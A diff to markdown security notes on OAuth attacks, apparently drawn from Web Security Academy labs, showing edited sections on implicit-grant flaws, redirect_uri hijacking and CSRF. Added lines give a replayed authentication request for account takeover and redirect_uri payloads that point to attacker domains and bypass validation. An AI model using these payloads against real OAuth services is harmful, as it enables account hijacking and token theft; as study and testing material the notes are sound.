@@ -22,25 +22,11 @@ If using an external OAuth service, identify the provider by the hostname in the
 * `/.well-known/oauth-authorization-server`
 * `/.well-known/openid-configuration`
 
-## <mark style="color:yellow;">Vulnerabilities in the OAuth client application</mark>
+## <mark style="color:yellow;">Vulnerabilities</mark>
 
 ### <mark style="color:yellow;">Improper implementation of the implicit grant type</mark>
 
-In this flow, the access token is sent from the OAuth service to the client application via the user's browser as a URL fragment. The client application then accesses the token using JavaScript. The trouble is, if the application wants to maintain the session after the user closes the page, it needs to store the current user data (normally a user ID and the access token) somewhere.
-
-```http
-GET /auth?client_id=rgerdgreg&redirect_uri=https://app.net/oauth-callback&response_type=token&nonce=567731209&scope=openid%20profile%20email HTTP/2
-Host: oauth.app-server.net
-[...]
-
-HTTP/2 302 Found
-Location: https://app.net/oauth-callback#access_token=ckNqkfxB&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email
-
-GET /oauth-callback HTTP/2
-Host: app.net
-```
-
-To solve this problem, the client application will often submit this data to the server in a `POST` request and then assign the user a session cookie, effectively logging them in. This request is roughly equivalent to the form submission request that might be sent as part of a classic, password-based login. However, in this scenario, the server does not have any secrets or passwords to compare with the submitted data, which means that it is implicitly trusted.
+At the conclusion of the login process, the client application often sends the username and access token to the server via a `POST` request. The server then issues a session cookie, effectively completing the login and establishing the user session
 
 ```http
 POST /authenticate HTTP/2
@@ -50,7 +36,33 @@ Host: 0a55005703e1680182bd7f6100b60068.web-security-academy.net
 {"email":"lebron@cleveland.com","username":"lebron","token":"ckNqkfxB"}
 ```
 
-Exploitation: repeat this request with an arbitrary account (changing email and username)
+```http
+HTTP/2 302 Found
+Location: /
+Set-Cookie: session=OixJC365d0v7yaU1l1xEnCCtfnRZDhZe; Secure; HttpOnly; SameSite=None
+```
+
+Exploitation: repeat this request with an arbitrary account (changing email and username) and leaving the access token
+
+### <mark style="color:yellow;">Account hijacking via redirect\_uri</mark>
+
+Replace redirect\_uri with a attacker controlled domain
+
+```
+https://oauth-x.oauth-server.net/auth?client_id=xyz&redirect_uri=https://attack.com/oauth-callback&response_type=code&scope=openid profile email
+```
+
+{% hint style="info" %}
+**Note**: using `state` or `nonce` protection does not necessarily prevent these attacks because an attacker can generate new values from their own browser.
+{% endhint %}
+
+**Flawed redirect\_uri validation**
+
+```
+https://default-host.com@foo.evil-user.net
+https://oauth-xxx-server.com/?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net
+https://localhost.evil-user.net
+```
 
 ### <mark style="color:yellow;">Flawed CSRF protection</mark>
 
@@ -63,14 +75,4 @@ Consider a website that allows users to log in using either a classic, password-
 Note that if the site allows users to log in exclusively via OAuth, the `state` parameter is arguably less critical. However, not using a `state` parameter can still allow attackers to construct login CSRF attacks, whereby the user is tricked into logging in to the attacker's account.
 
 \
-TO DO
-
-## Vulnerabilities in the OAuth service
-
-### Leaking authorization codes and access tokens <a href="#leaking-authorization-codes-and-access-tokens" id="leaking-authorization-codes-and-access-tokens"></a>
-
-Depending on the grant type, either a code or token is sent via the victim's browser to the `/callback` endpoint specified in the `redirect_uri` parameter of the authorization request. If the OAuth service fails to validate this URI properly, an attacker may be able to construct a CSRF-like attack, tricking the victim's browser into initiating an OAuth flow that will send the code or token to an attacker-controlled `redirect_uri` stealing it. They can then send this code to the client application's legitimate `/callback` endpoint (the original `redirect_uri`) to get access to the user's account
-
-Note that using `state` or `nonce` protection does not necessarily prevent these attacks because an attacker can generate new values from their own browser.
-
 \
